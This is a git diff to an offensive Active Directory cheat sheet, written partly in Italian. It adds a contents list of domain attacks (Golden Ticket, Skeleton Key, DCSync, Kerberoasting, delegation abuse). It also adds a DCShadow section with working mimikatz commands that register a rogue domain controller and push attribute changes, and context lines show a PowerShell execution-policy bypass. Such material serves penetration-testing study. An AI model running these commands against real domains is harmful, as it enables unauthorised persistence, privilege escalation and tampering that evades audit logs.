@@ -1,5 +1,46 @@
 # Active-Directory-Cheat-Sheet
+# Summary
+* [General](#General)
+* [Domain Enumeration](#Domain-Enumeration)
+    * [Powerview Domain](#Powerview-Domain)
+    * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) 
+    * [Powerview Shares](#Powerview-shares)
+    * [Powerview GPO](#Powerview-GPO)
+    * [Powerview ACL](#Powerview-ACL)
+    * [Powerview Domain Trust](#Powerview-Domain-Trust)
+    * [Misc](#misc) 
+* [Local privilege escalation](#Local-privilege-escalation)
+* [Lateral Movement](#Lateral-Movement)
+   * [General](#General) 
+   * [Mimikatz](#Mimikatz) 
+* [Domain Persistence](#Domain-Persistence)
+   * [Golden Ticket](#Golden-Ticket) 
+   * [Silver Ticket](#Silver-Ticket)
+   * [Skeleton Key](#Skeleton-Key)
+   * [DSRM](#DSRM)
+   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
+   * [ACL](#ACL)
+      * [AdminSDHolder](#AdminSDHolder)
+      * [DCsync](#DCsync)
+      * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
+      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
+      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
+* [Domain privilege escalation](#Domain-privilege-escalation)
+   * [Kerberoast](#Kerberoast) 
+   * [AS-REPS Roasting](#AS-REPS-Roasting) 
+   * [Set SPN](#Set-SPN) 
+   * [Unconstrained Delegation](#Unconstrained-delegation) 
+   * [Constrained Delegation](#Constrained-delegation) 
+   * [DNS Admins](#DNS-Admins) 
+   * [Abuse SQL](#Abuse-SQL) 
+   * [Enterprise Admins](#Enterprise-Admins) 
+      * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
+      * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
+   * [Crossforest attacks](#Crossforest-attacks)
+      * [Trust flow](#Trust-flow) 
+      
 
+# General
 ## Bypass Execution Policy
 ```
 	- powershell -ep bypass -c "command"
@@ -20,7 +61,7 @@
 	- Get-Credentials [via RDP]
 	- Enter-PSSession -ComputerName techsrv30.tech.finance.corp -Credential tech\techservice [successivamente verrà chiesta la password]
 ```
-## Enumeration via Powerview
+# Domain-Enumeration
 
 ### PowerView:
 - Domain/USER Enumeration
@@ -460,4 +501,14 @@ Execute the task
 ```
 
 ## DCShadow
-### DCShadow registra temporaneamente un nuovo controller di dominio nel dominio di destinazione e lo utilizza per "spingere" attributi come SIDHistory, SPN ecc.) su oggetti specificati senza lasciare i registri delle modifiche per l'oggetto modificato! Il nuovo controller di dominio viene registrato modificando il contenitore della configurazione, gli SPN di un oggetto computer esistente e un paio di servizi RPC. Poiché gli attributi vengono modificati da un controller di dominio", non sono presenti registri di modifica della directory nel controller di dominio effettivo per l'oggetto di destinazione. Per impostazione predefinita, i privilegi DA sono necessari per utilizzare DCShadow. La macchina dell'aggressore deve far parte del dominio principale.
+### DCShadow allows an attacker with enough privileges to create a rogue Domain Controller and push changes to the DC Active Directory objects.
+### Per impostazione predefinita, i privilegi DA sono necessari per utilizzare DCShadow. La macchina dell'aggressore deve far parte del dominio principale.
+### Per questo attacco sono necessarie due shell: una in esecuzione con privilegi SYSTEM e una con privilegi di un utente che fa parte del gruppo Domain Admins.
+
+### Verrà modificato il computer pc-w10$
+
+```
+		- PS c:\> ([adsisearcher]"(&(objectCategory=Computer)(name=pc-w10))").Findall().Properties (verrà cambiato una proprietà di questo oggetto di AD)
+		- lsadump::dcshadow /object:pc-w10$ /attribute:badpwdcount /value=9999 (Console SYSTEM)
+		- lsadump::dcshadow /push
+```
